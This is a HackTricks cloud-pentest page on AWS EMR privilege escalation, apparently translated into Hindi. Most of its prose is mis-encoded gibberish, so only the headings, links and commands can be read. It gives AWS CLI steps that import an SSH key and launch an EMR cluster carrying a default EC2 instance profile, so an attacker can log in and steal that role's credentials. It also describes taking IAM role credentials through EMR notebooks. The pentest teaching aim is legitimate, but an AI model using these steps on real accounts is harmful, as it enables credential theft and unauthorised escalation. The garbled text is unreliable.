# AWS - EMR Privesc

<details>

<summary><strong>рд╢реВрдиреНрдп рд╕реЗ рдирд╛рдпрдХ рддрдХ AWS рд╣реИрдХрд┐рдВрдЧ рд╕реАрдЦреЗрдВ</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

HackTricks рдХрд╛ рд╕рдорд░реНрдерди рдХрд░рдиреЗ рдХреЗ рдЕрдиреНрдп рддрд░реАрдХреЗ:

* рдпрджрд┐ рдЖрдк рдЪрд╛рд╣рддреЗ рд╣реИрдВ рдХрд┐ рдЖрдкрдХреА **рдХрдВрдкрдиреА рдХрд╛ рд╡рд┐рдЬреНрдЮрд╛рдкрди HackTricks рдореЗрдВ рджрд┐рдЦрд╛рдИ рджреЗ** рдпрд╛ **HackTricks рдХреЛ PDF рдореЗрдВ рдбрд╛рдЙрдирд▓реЛрдб рдХрд░реЗрдВ**, рддреЛ [**рд╕рдмреНрд╕рдХреНрд░рд┐рдкреНрд╢рди рдкреНрд▓рд╛рдиреНрд╕**](https://github.com/sponsors/carlospolop) рджреЗрдЦреЗрдВ!
* [**рдЖрдзрд┐рдХрд╛рд░рд┐рдХ PEASS & HackTricks рд╕реНрд╡реИрдЧ**](https://peass.creator-spring.com) рдкреНрд░рд╛рдкреНрдд рдХрд░реЗрдВ
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family) рдХреА рдЦреЛрдЬ рдХрд░реЗрдВ, рд╣рдорд╛рд░рд╛ рд╡рд┐рд╢реЗрд╖ [**NFTs**](https://opensea.io/collection/the-peass-family) рд╕рдВрдЧреНрд░рд╣
* ЁЯТм [**Discord group**](https://discord.gg/hRep4RUj7f) рдореЗрдВ **рд╢рд╛рдорд┐рд▓ рд╣реЛрдВ** рдпрд╛ [**telegram group**](https://t.me/peass) рдореЗрдВ рдпрд╛ **Twitter** рдкрд░ ЁЯРж [**@carlospolopm**](https://twitter.com/carlospolopm) рдХреЛ **рдлреЙрд▓реЛ рдХрд░реЗрдВ**.
* [**HackTricks**](https://github.com/carlospolop/hacktricks) рдФрд░ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos рдореЗрдВ PRs рд╕рдмрдорд┐рдЯ рдХрд░рдХреЗ рдЕрдкрдиреА рд╣реИрдХрд┐рдВрдЧ рдЯреНрд░рд┐рдХреНрд╕ рд╕рд╛рдЭрд╛ рдХрд░реЗрдВред

</details>

## EMR

EMR рдХреЗ рдмрд╛рд░реЗ рдореЗрдВ рдЕрдзрд┐рдХ **рдЬрд╛рдирдХрд╛рд░реА**:

{% content-ref url="../aws-services/aws-emr-enum.md" %}
[aws-emr-enum.md](../aws-services/aws-emr-enum.md)
{% endcontent-ref %}

### `iam:PassRole`, `elasticmapreduce:RunJobFlow`

рдЗрди рдЕрдиреБрдорддрд┐рдпреЛрдВ рдХреЗ рд╕рд╛рде рдПрдХ рд╣рдорд▓рд╛рд╡рд░ **рдирдпрд╛ EMR рдХреНрд▓рд╕реНрдЯрд░ рдЪрд▓рд╛ рд╕рдХрддрд╛ рд╣реИ EC2 рд░реЛрд▓реНрд╕ рдХреЛ рдЬреЛрдбрд╝рддреЗ рд╣реБрдП** рдФрд░ рдЙрд╕рдХреА рд╕рд╛рдЦ рдкреНрд░рд╛рдкреНрдд рдХрд░рдиреЗ рдХреА рдХреЛрд╢рд┐рд╢ рдХрд░ рд╕рдХрддрд╛ рд╣реИред\
рдзреНрдпрд╛рди рджреЗрдВ рдХрд┐ рдЗрд╕рдХреЗ рд▓рд┐рдП рдЖрдкрдХреЛ **рдЦрд╛рддреЗ рдореЗрдВ рдЖрдпрд╛рддрд┐рдд рдХреБрдЫ ssh рдкреНрд░рд╛рдЗрд╡реЗрдЯ рдХреА рдЬрд╛рдирдиреЗ рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рд╣реЛрдЧреА** рдпрд╛ рдПрдХ рдХреА рдЖрдпрд╛рдд рдХрд░рдиреА рд╣реЛрдЧреА, рдФрд░ **рдорд╛рд╕реНрдЯрд░ рдиреЛрдб рдореЗрдВ рдкреЛрд░реНрдЯ 22 рдЦреЛрд▓рдиреЗ рдореЗрдВ рд╕рдХреНрд╖рдо рд╣реЛрдирд╛ рдЪрд╛рд╣рд┐рдП** (рдЖрдк рдЗрд╕реЗ `--ec2-attributes` рдХреЗ рдЕрдВрджрд░ `EmrManagedMasterSecurityGroup` рдФрд░/рдпрд╛ `ServiceAccessSecurityGroup` рдЧреБрдгреЛрдВ рдХреЗ рд╕рд╛рде рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ)ред
```bash
# Import EC2 ssh key (you will need extra permissions for this)
ssh-keygen -b 2048 -t rsa -f /tmp/sshkey -q -N ""
chmod 400 /tmp/sshkey
base64 /tmp/sshkey.pub > /tmp/pub.key
aws ec2 import-key-pair \
--key-name "privesc" \
--public-key-material file:///tmp/pub.key


aws emr create-cluster \
--release-label emr-5.15.0 \
--instance-type m4.large \
--instance-count 1 \
--service-role EMR_DefaultRole \
--ec2-attributes InstanceProfile=EMR_EC2_DefaultRole,KeyName=privesc

# Wait 1min and connect via ssh to an EC2 instance of the cluster)
aws emr describe-cluster --cluster-id <id>
# In MasterPublicDnsName you can find the DNS to connect to the master instance
## You cna also get this info listing EC2 instances
```
рдзреНрдпрд╛рди рджреЗрдВ рдХрд┐ `--service-role` рдореЗрдВ **EMR рднреВрдорд┐рдХрд╛** рдФрд░ `--ec2-attributes` рдореЗрдВ **ec2 рднреВрдорд┐рдХрд╛** `InstanceProfile` рдХреЗ рдЕрдВрджрд░ рдирд┐рд░реНрджрд┐рд╖реНрдЯ рдХреА рдЧрдИ рд╣реИред рд╣рд╛рд▓рд╛рдВрдХрд┐, рдпрд╣ рддрдХрдиреАрдХ рдХреЗрд╡рд▓ EC2 рднреВрдорд┐рдХрд╛ рдХреА рд╕рд╛рдЦ (credentials) рдЪреБрд░рд╛рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рджреЗрддреА рд╣реИ (рдХреНрдпреЛрдВрдХрд┐ рдЖрдк ssh рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ рдЬреБрдбрд╝реЗрдВрдЧреЗ) рд▓реЗрдХрд┐рди EMR IAM рднреВрдорд┐рдХрд╛ рдХреА рдирд╣реАрдВред

**рд╕рдВрднрд╛рд╡рд┐рдд рдкреНрд░рднрд╛рд╡:** EC2 рд╕реЗрд╡рд╛ рднреВрдорд┐рдХрд╛ рдХреЗ рд▓рд┐рдП Privesc рдЬреЛ рдирд┐рд░реНрджрд┐рд╖реНрдЯ рд╣реИред

### `elasticmapreduce:CreateEditor`, `iam:ListRoles`, `elasticmapreduce:ListClusters`, `iam:PassRole`, `elasticmapreduce:DescribeEditor`, `elasticmapreduce:OpenEditorInConsole`

рдЗрди рдЕрдиреБрдорддрд┐рдпреЛрдВ рдХреЗ рд╕рд╛рде рдПрдХ рд╣рдорд▓рд╛рд╡рд░ **AWS рдХрдВрд╕реЛрд▓** рдкрд░ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ, рдПрдХ рдиреЛрдЯрдмреБрдХ рдмрдирд╛ рд╕рдХрддрд╛ рд╣реИ рдФрд░ рдЙрд╕реЗ рдПрдХреНрд╕реЗрд╕ рдХрд░рдХреЗ IAM рднреВрдорд┐рдХрд╛ рдЪреБрд░рд╛ рд╕рдХрддрд╛ рд╣реИред

{% hint style="danger" %}
рдпрд╣рд╛рдВ рддрдХ рдХрд┐ рдЕрдЧрд░ рдЖрдк рдиреЛрдЯрдмреБрдХ рдЗрдВрд╕реНрдЯреЗрдВрд╕ рдореЗрдВ IAM рднреВрдорд┐рдХрд╛ рдЬреЛрдбрд╝рддреЗ рд╣реИрдВ, рдореЗрд░реЗ рдкрд░реАрдХреНрд╖рдгреЛрдВ рдореЗрдВ рдореИрдВрдиреЗ рджреЗрдЦрд╛ рдХрд┐ рдореИрдВ AWS рдкреНрд░рдмрдВрдзрд┐рдд рд╕рд╛рдЦ рдЪреБрд░рд╛ рд╕рдХрддрд╛ рд╣реВрдВ рдФрд░ IAM рднреВрдорд┐рдХрд╛ рд╕реЗ рд╕рдВрдмрдВрдзрд┐рдд рд╕рд╛рдЦ рдирд╣реАрдВред
{% endhint %}

**рд╕рдВрднрд╛рд╡рд┐рдд рдкреНрд░рднрд╛рд╡:** AWS рдкреНрд░рдмрдВрдзрд┐рдд рднреВрдорд┐рдХрд╛ arn:aws:iam::420254708011:instance-profile/prod-EditorInstanceProfile рдХреЗ рд▓рд┐рдП Privesc

### `elasticmapreduce:OpenEditorInConsole`

рдХреЗрд╡рд▓ рдЗрд╕ рдЕрдиреБрдорддрд┐ рдХреЗ рд╕рд╛рде рдПрдХ рд╣рдорд▓рд╛рд╡рд░ **Jupyter рдиреЛрдЯрдмреБрдХ рдПрдХреНрд╕реЗрд╕ рдХрд░ рд╕рдХрддрд╛ рд╣реИ рдФрд░ рдЙрд╕рд╕реЗ рдЬреБрдбрд╝реА IAM рднреВрдорд┐рдХрд╛ рдЪреБрд░рд╛ рд╕рдХрддрд╛ рд╣реИ**ред\
рдиреЛрдЯрдмреБрдХ рдХрд╛ URL рд╣реИ `https://<notebook-id>.emrnotebooks-prod.eu-west-1.amazonaws.com/<notebook-id>/lab/`

{% hint style="danger" %}
рдпрд╣рд╛рдВ рддрдХ рдХрд┐ рдЕрдЧрд░ рдЖрдк рдиреЛрдЯрдмреБрдХ рдЗрдВрд╕реНрдЯреЗрдВрд╕ рдореЗрдВ IAM рднреВрдорд┐рдХрд╛ рдЬреЛрдбрд╝рддреЗ рд╣реИрдВ, рдореЗрд░реЗ рдкрд░реАрдХреНрд╖рдгреЛрдВ рдореЗрдВ рдореИрдВрдиреЗ рджреЗрдЦрд╛ рдХрд┐ рдореИрдВ AWS рдкреНрд░рдмрдВрдзрд┐рдд рд╕рд╛рдЦ рдЪреБрд░рд╛ рд╕рдХрддрд╛ рд╣реВрдВ рдФрд░ IAM рднреВрдорд┐рдХрд╛ рд╕реЗ рд╕рдВрдмрдВрдзрд┐рдд рд╕рд╛рдЦ рдирд╣реАрдВред
{% endhint %}

**рд╕рдВрднрд╛рд╡рд┐рдд рдкреНрд░рднрд╛рд╡:** AWS рдкреНрд░рдмрдВрдзрд┐рдд рднреВрдорд┐рдХрд╛ arn:aws:iam::420254708011:instance-profile/prod-EditorInstanceProfile рдХреЗ рд▓рд┐рдП Privesc

<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert) рдХреЗ рд╕рд╛рде AWS рд╣реИрдХрд┐рдВрдЧ рд╕реАрдЦреЗрдВ</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>рд╢реВрдиреНрдп рд╕реЗ рд╣реАрд░реЛ рддрдХ</strong></a><strong>!</strong></summary>

HackTricks рдХрд╛ рд╕рдорд░реНрдерди рдХрд░рдиреЗ рдХреЗ рдЕрдиреНрдп рддрд░реАрдХреЗ:

* рдЕрдЧрд░ рдЖрдк рдЪрд╛рд╣рддреЗ рд╣реИрдВ рдХрд┐ рдЖрдкрдХреА **рдХрдВрдкрдиреА рдХрд╛ рд╡рд┐рдЬреНрдЮрд╛рдкрди HackTricks рдореЗрдВ рджрд┐рдЦрд╛рдИ рджреЗ** рдпрд╛ **HackTricks рдХреЛ PDF рдореЗрдВ рдбрд╛рдЙрдирд▓реЛрдб рдХрд░реЗрдВ**, рддреЛ [**рд╕рджрд╕реНрдпрддрд╛ рдпреЛрдЬрдирд╛рдУрдВ**](https://github.com/sponsors/carlospolop) рдХреА рдЬрд╛рдВрдЪ рдХрд░реЗрдВ!
* [**рдЖрдзрд┐рдХрд╛рд░рд┐рдХ PEASS & HackTricks рд╕реНрд╡реИрдЧ**](https://peass.creator-spring.com) рдкреНрд░рд╛рдкреНрдд рдХрд░реЗрдВ
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family) рдХреА рдЦреЛрдЬ рдХрд░реЗрдВ, рд╣рдорд╛рд░рд╛ рд╡рд┐рд╢реЗрд╖ [**NFTs**](https://opensea.io/collection/the-peass-family) рд╕рдВрдЧреНрд░рд╣
* ЁЯТм [**Discord рд╕рдореВрд╣**](https://discord.gg/hRep4RUj7f) рдореЗрдВ **рд╢рд╛рдорд┐рд▓ рд╣реЛрдВ** рдпрд╛ [**telegram рд╕рдореВрд╣**](https://t.me/peass) рдореЗрдВ рдпрд╛ **Twitter** ЁЯРж рдкрд░ рдореБрдЭреЗ **рдлреЙрд▓реЛ** рдХрд░реЗрдВ [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **HackTricks** рдХреЗ [**github repos**](https://github.com/carlospolop/hacktricks) рдФрд░ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) рдореЗрдВ PRs рд╕рдмрдорд┐рдЯ рдХрд░рдХреЗ рдЕрдкрдиреА рд╣реИрдХрд┐рдВрдЧ рдЯреНрд░рд┐рдХреНрд╕ рд╕рд╛рдЭрд╛ рдХрд░реЗрдВред

</details>
